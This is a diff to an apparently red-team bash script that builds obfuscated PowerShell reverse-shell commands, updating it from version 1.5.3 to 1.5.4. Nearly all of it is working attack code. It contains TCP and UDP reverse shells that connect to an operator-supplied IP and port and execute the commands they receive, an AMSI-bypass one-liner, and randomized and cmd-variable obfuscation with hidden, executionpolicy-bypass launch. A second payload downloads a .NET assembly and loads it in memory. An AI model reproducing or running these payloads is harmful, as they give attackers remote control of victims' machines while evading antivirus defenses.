@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.5.3"
+version="1.5.4"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -659,9 +659,10 @@ fi
 #Check if Windows
 if [[ $3 == "w" ]]
 then 
+    windows=1
     win="-W%${space}%Hidden"
     at="@"
-    #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
+    #"Mini-AMSI-bypass. Partial"
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
     
   
@@ -675,18 +676,22 @@ fi
 
 if [[ $4 == "udp" ]]
 then
-#UDP
-
-shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+    #UDP
+    shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
 else
     
-#TCP
+    #TCP
    shell="$AMSIb$disableLog$fAMSIb$func\$$client = New-Object Net.\$$placeh\"Sockets.TCPClient\"('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName Text.UTF8Encoding).GetString(\$$bytes,0,\$$i);\$$sendback = (Invoke-expression \". { \$$data } 2>&1\" | Out-String ); \$$sendback2 = \$$sendback + (\$env:UserName) + '$at' + (\$env:UserDomain) + ([Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
-rev="cmd /c \"set ${pwsh}=${pw_sh} & set ${space}=\" \" $mssense & call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}\""
 
+if [[ $windows == 1 ]]
+then
+    rev="cmd /c \"set ${pwsh}=${pw_sh} & set ${space}=\" \" $mssense & call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}\""
+else
+    rev="${pw_sh} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
+fi
 
 if [[ $5 == "vba" ]] 
 then
@@ -779,11 +784,16 @@ fi
 bytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
 assembly=$(openssl rand -hex $(shuf -i 1-11 -n1))
 entryPointMethod=$(openssl rand -hex $(shuf -i 1-11 -n1))
-AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*s'}).GetFields(2*20)|?{\$_-clike'*d'}).SetValue(\$null,\$true);$fAMSIb"
+placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
+space=$(shuf -er -n3  {A..Z} {a..z} | tr -d '\n')
+wevutil=$(shuf -er -n20  {A..Z} {a..z} | tr -d '\n')
+pwsh=$(shuf -er -n21  {A..Z} {a..z} | tr -d '\n')
+
+AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
 
 rev="$AMSIb\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$null;\$$entryPointMethod.Invoke(\$null, (, [string[]] ('$IP', '$PORT')))"
 rev=$(echo -n $rev| iconv --to-code UTF-16LE | $benc --base64 -w0)
-rev="powershell -W Hidden -noprofile -executionpolicy bypass -NoExit -e ${rev}"
+rev="cmd /c \"set ${pwsh}=powershell & set ${space}=\" \" & call %${pwsh}%%${space}%-W%${space}%Hidden%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${rev}\""
 
 if [[ $OS == "Darwin" ]]
 then
